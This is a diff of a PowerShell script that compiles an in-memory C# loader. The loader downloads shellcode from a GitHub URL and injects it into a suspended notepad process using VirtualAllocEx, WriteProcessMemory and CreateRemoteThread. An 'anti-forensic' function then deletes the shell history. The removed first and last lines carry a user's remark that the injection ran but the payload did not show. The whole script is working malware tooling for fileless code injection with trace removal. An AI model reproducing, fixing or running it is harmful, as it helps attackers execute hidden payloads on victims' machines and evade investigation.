@@ -1,57 +1,64 @@
-so my this is my current code "# --- CONFIGURATION ---
+# --- CONFIGURATION ---
 # [IMPORTANT] Paste your Raw GitHub URL here for payload.bin
 $PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"
+
+
 # --- PART 1: THE C# LOADER (The Engine) ---
 $Code = @"
 using System;
 using System.Runtime.InteropServices;
 using System.Net;
+
 public class FilelessLoader {
-   
+    
     // --- P/Invoke Definitions ---
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcess(
-        string lpApplicationName,
-        string lpCommandLine,
-        IntPtr lpProcessAttributes,
-        IntPtr lpThreadAttributes,
-        bool bInheritHandles,
-        uint dwCreationFlags,
-        IntPtr lpEnvironment,
-        string lpCurrentDirectory,
-        ref STARTUPINFO lpStartupInfo,
+        string lpApplicationName, 
+        string lpCommandLine, 
+        IntPtr lpProcessAttributes, 
+        IntPtr lpThreadAttributes, 
+        bool bInheritHandles, 
+        uint dwCreationFlags, 
+        IntPtr lpEnvironment, 
+        string lpCurrentDirectory, 
+        ref STARTUPINFO lpStartupInfo, 
         out PROCESS_INFORMATION lpProcessInformation
     );
+
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr VirtualAllocEx(
-        IntPtr hProcess,
-        IntPtr lpAddress,
-        uint dwSize,
-        uint flAllocationType,
+        IntPtr hProcess, 
+        IntPtr lpAddress, 
+        uint dwSize, 
+        uint flAllocationType, 
         uint flProtect
     );
+
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool WriteProcessMemory(
-        IntPtr hProcess,
-        IntPtr lpBaseAddress,
-        byte[] lpBuffer,
-        uint nSize,
+        IntPtr hProcess, 
+        IntPtr lpBaseAddress, 
+        byte[] lpBuffer, 
+        uint nSize, 
         out IntPtr lpNumberOfBytesWritten
     );
+
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern IntPtr CreateRemoteThread(
-        IntPtr hProcess,
-        IntPtr lpThreadAttributes,
-        uint dwStackSize,
-        IntPtr lpStartAddress,
-        IntPtr lpParameter,
-        uint dwCreationFlags,
+        IntPtr hProcess, 
+        IntPtr lpThreadAttributes, 
+        uint dwStackSize, 
+        IntPtr lpStartAddress, 
+        IntPtr lpParameter, 
+        uint dwCreationFlags, 
         IntPtr lpThreadId
     );
-   
+    
     // [FIX] Added ResumeThread to wake up the process
     [DllImport("kernel32.dll", SetLastError = true)]
     public static extern uint ResumeThread(IntPtr hThread);
+
     // --- Corrected Data Structures ---
     [StructLayout(LayoutKind.Sequential)]
     public struct STARTUPINFO
@@ -75,13 +82,15 @@ public class FilelessLoader {
         public IntPtr hStdOutput;
         public IntPtr hStdError;
     }
+
     [StructLayout(LayoutKind.Sequential)]
-    public struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
+    public struct PROCESS_INFORMATION { 
+        public IntPtr hProcess; 
+        public IntPtr hThread; 
+        public int dwProcessId; 
+        public int dwThreadId; 
     }
+
     // --- The Main Logic ---
     public static void Execute(string url) {
         try {
@@ -89,41 +98,46 @@ public class FilelessLoader {
             ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
             WebClient wc = new WebClient();
             byte[] shellcode = wc.DownloadData(url);
-           
+            
             if (shellcode.Length == 0) {
                 Console.WriteLine("[-] Download failed. Check URL.");
                 return;
             }
+
             Console.WriteLine("[*] Starting Notepad (Suspended)...");
-           
+            
             STARTUPINFO si = new STARTUPINFO();
             si.cb = (uint)Marshal.SizeOf(si);
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-           
+            
             // 0x4 = CREATE_SUSPENDED
             bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
-           
-            if (!success) {
-                Console.WriteLine("[-] Failed to create process. Error Code: " + Marshal.GetLastWin32Error());
-                return;
+            
+            if (!success) { 
+                Console.WriteLine("[-] Failed to create process. Error Code: " + Marshal.GetLastWin32Error()); 
+                return; 
             }
+
             Console.WriteLine("[*] Process ID: " + pi.dwProcessId);
             Console.WriteLine("[*] Allocating RWX Memory...");
             IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+
             if (remoteMem == IntPtr.Zero) {
                  Console.WriteLine("[-] Allocation failed.");
                  return;
             }
+
             Console.WriteLine("[*] Writing Payload...");
             IntPtr bytesWritten;
             WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);
+
             Console.WriteLine("[*] Detonating via Remote Thread...");
             CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
-           
+            
             // [FIX] Resume the main thread so Notepad actually appears!
             Console.WriteLine("[*] Waking up Notepad (ResumeThread)...");
             ResumeThread(pi.hThread);
-           
+            
             Console.WriteLine("[+] Injection Complete. Notepad should be visible.");
         }
         catch (Exception e) {
@@ -132,12 +146,14 @@ public class FilelessLoader {
     }
 }
 "@
+
+
 # --- PART 2: ANTI-FORENSICS (The Cleaner) ---
 function Invoke-StealthCleanup {
     Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow
     Set-PSReadlineOption -HistorySaveStyle SaveNothing
     $HistoryPath = (Get-PSReadlineOption).HistorySavePath
-   
+    
     if (Test-Path $HistoryPath) {
         try {
             Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
@@ -148,7 +164,10 @@ function Invoke-StealthCleanup {
         }
     }
 }
+
+
 # --- PART 3: EXECUTION CHAIN ---
+
 Write-Host "[*] Compiling Loader in Memory..." -ForegroundColor Cyan
 try {
     Add-Type -TypeDefinition $Code -Language CSharp
@@ -159,10 +178,13 @@ catch {
     Read-Host "Press ENTER to exit..."
     exit
 }
+
 # Execute
 [FilelessLoader]::Execute($PayloadUrl)
+
 # Cleanup
 Invoke-StealthCleanup
+
 # [FIX] Pause so you can read the screen before it closes
 Write-Host "`n[!] Script Finished." -ForegroundColor Cyan
-Read-Host "Press ENTER to close this window..."" it succesfully worked, but my payload didnt appear in the notepad, it just opened notepad regulary
+Read-Host "Press ENTER to close this window..."
